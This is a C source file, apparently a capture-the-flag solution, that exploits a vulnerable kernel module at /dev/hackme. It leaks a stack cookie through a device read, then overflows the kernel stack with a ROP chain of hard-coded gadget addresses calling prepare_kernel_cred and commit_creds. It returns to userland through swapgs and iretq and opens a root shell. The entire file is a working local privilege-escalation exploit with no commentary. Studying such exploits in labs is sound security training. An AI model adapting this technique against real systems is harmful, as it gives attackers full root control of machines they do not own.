#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

int global_fd;

void open_dev() {
    global_fd = open("/dev/hackme", O_RDWR);
    if (global_fd < 0) {
        puts("[!] Failed to open device");
        exit(-1);
    }
    puts("[*] Opened device");
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
           );
    puts("[*] Saved state");
}

unsigned long cookie;

void leak(void) {
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}

void get_shell(void) {
    puts("[*] Returned to userland");
    if (getuid() == 0) {
        printf("[*] UID: %d, got root\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long user_rip = (unsigned long)get_shell;

unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rdx = 0xffffffff81007616;
unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4;
unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;
unsigned long iretq = 0xffffffff8100c0d9;

void overflow(void) {
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;

    payload[off++] = cookie;

    puts("[*] Inserting cookie");

    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    payload[off++] = pop_rdi_ret;
    payload[off++] = 0x0;
    payload[off++] = prepare_kernel_cred;

    puts("[*] Filling dummy pops");

    payload[off++] = pop_rdx;
    payload[off++] = 0x8;

    puts("[*] Filling rdx with 0x8");

    payload[off++] = cmp_rdx_jne_pop2_ret;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    puts("[*] Compare rdx with 0x8 and pop2 + fill");

    payload[off++] = mov_rdi_rax_jne_pop2_ret;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    puts("[*] mov rdi, rax, jne, pop2, fill");

    payload[off++] = commit_creds;
    payload[off++] = swapgs_pop1_ret;
    payload[off++] = 0x0;
    payload[off++] = iretq;
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never have been reached");
}

// unsigned long mov_esp_pop2_ret = 0xffffffff8196f56a;
// unsigned long pop_rdi_ret = 0xffffffff81006370;
// 
// void build_fake_stack(void) {
    // fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    // unsigned off = 0x1000 / 8;
    // fake_stack[0] = 0xdead;
    // fake_stack[off++] = 0x0;
    // fake_stack[off++] = 0x0;
// }

int main() {
    
    save_state();

    open_dev();

    leak();

    overflow();

    puts("[!] Should never be reached");

    return 0;
}
